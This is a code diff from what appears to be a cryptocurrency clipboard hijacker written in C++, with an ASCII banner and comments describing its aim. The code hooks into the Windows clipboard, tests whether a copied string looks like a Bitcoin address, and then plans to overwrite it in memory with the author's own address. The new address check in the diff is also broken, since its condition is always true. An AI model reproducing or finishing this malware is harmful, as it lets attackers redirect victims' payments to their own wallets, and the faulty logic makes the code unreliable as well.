@@ -23,7 +23,7 @@ namespace Main
 		cout << "      \\ \\  \\____\\ \\  \\____\\ \\  \\ \\  \\___|\\  \\\\_\\  \\ \\  \\ \\  \\ \\  \\____\\ \\  \\\\ \\  \\ " << endl;
 		cout << "       \\ \\_______\\ \\_______\\ \\__\\ \\__\\  \\ \\________\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ \\__\\" << endl;
 		cout << "        \\|_______|\\|_______|\\|__|\\|__|   \\|________|\\|__|\\|__|\\|_______|\\|__| \\|__|" << endl;
-		cout << "             												 					      v2.0 by Ferib" << endl;
+		cout << "             																				v2.0 by Ferib" << endl;
 
 		user32GetClipboardData = (uintptr_t)GetProcAddress(GetModuleHandle(L"user32.dll"), "GetClipboardData");
 
@@ -88,20 +88,24 @@ namespace Main
 			cout << msg << endl; //Print the copy'd string in console
 
 			//init some more variables
-			int CurrentMatch = -1;
-			int MatchLetters = 0;
 			bool IsMatch = true;
+			int StringSize = 0;	//Bitcoin addresses are mostly 32 chars, and only contain "base58" characters
+
+			//TODO: Define Base58 and filter out addresses that contain non-base58 characters
 
 			//Quick Mafs to check if copy'd string is a bitcoin address
 			for (int i = 0; i < sizeof(BitcoinAddress); i++) {
-				if (*(char*)(cptr + (MatchLetters * 2)) != 0x00 && BitcoinAddress[i] == *(char*)(cptr + (MatchLetters * 2))) {
-					MatchLetters++;
+				if (*(char*)(cptr + (i * 2)) != 0x00) {
+					StringSize++;
 				}
 				else {
 					IsMatch = false;
 					break;
 				}
 			}
+			//Bitcoin address should always start with 1 or 3
+			if (*(char*)(cptr) != '1' || *(char*)(cptr) != '3')
+				IsMatch = false;
 
 			//Time to overwrite the current address with our address in memory
 			if (IsMatch) {
